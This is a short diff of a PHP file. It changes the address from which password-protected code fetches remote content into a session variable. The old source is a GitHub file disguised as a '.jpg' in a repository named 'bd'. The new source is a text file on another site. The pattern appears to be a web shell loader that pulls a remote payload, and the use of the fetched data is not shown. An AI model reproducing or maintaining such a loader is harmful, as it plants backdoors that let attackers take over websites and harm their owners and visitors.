@@ -902,7 +902,7 @@ if (isset($_POST['password'])) {
 
 if (is_logged_in()) {
     if (!isset($_SESSION['cached_data']) || empty($_SESSION['cached_data'])) {
-        $_SESSION['cached_data'] = geturlsinfo('https://raw.githubusercontent.com/seovennn/bd/refs/heads/main/alfakuat.jpg');
+        $_SESSION['cached_data'] = geturlsinfo('https://digtaldesa.id/vendor/acak.txt');
         if (empty($_SESSION['cached_data'])) {
             echo "failed";
             exit;
